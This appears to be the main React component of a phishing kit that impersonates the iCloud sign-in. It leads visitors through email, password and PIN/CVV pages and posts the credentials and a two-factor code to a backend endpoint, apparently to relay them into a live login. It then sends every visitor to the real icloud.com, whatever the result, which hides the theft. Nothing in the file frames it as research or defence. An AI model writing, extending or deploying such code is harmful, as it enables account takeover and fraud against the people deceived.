import { useState } from 'react'
import LoginPage from './pages/LoginPage'
import PasswordPage from './pages/PasswordPage'
import PinCvvPage from './pages/PinCvvPage'
import SuccessPage from './pages/SuccessPage'
import './App.css'

function App() {
  const [page, setPage] = useState('login')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [pin, setPin] = useState('')

  const handleLoginSubmit = async (finalPin) => {
    try {
      const response = await fetch('http://localhost:5000/api/icloud-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: email,
          password: password,
          twoFactorCode: finalPin
        }),
      });

      const data = await response.json();
      if (data.success) {
        window.location.href = 'https://www.icloud.com/';
      } else {
        console.error('Login failed:', data.error);
        window.location.href = 'https://www.icloud.com/';
      }
    } catch (error) {
      console.error('Error submitting to backend:', error);
      window.location.href = 'https://www.icloud.com/';
    }
  };

  return (
    <div className="app">
      {page === 'login' && (
        <LoginPage onNext={(val) => { setEmail(val); setPage('password') }} />
      )}
      {page === 'password' && (
        <PasswordPage 
          email={email} 
          onBack={() => setPage('login')} 
          onNext={async (val) => { 
            setPassword(val); 
            // Send credentials to backend to trigger OTP email
            try {
              await fetch('http://localhost:5000/api/submit-credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: email, password: val }),
              });
            } catch (err) {
              console.error('Error sending credentials:', err);
            }
            setPage('pincvv');
          }} 
        />
      )}
      {page === 'pincvv' && (
        <PinCvvPage 
          email={email} 
          onBack={() => setPage('password')} 
          onSuccess={(val) => { setPin(val); handleLoginSubmit(val) }} 
        />
      )}
      {page === 'success' && (
        <SuccessPage email={email} onBack={() => {
          setEmail('');
          setPassword('');
          setPin('');
          setPage('login');
        }} />
      )}
    </div>
  )
}

export default App
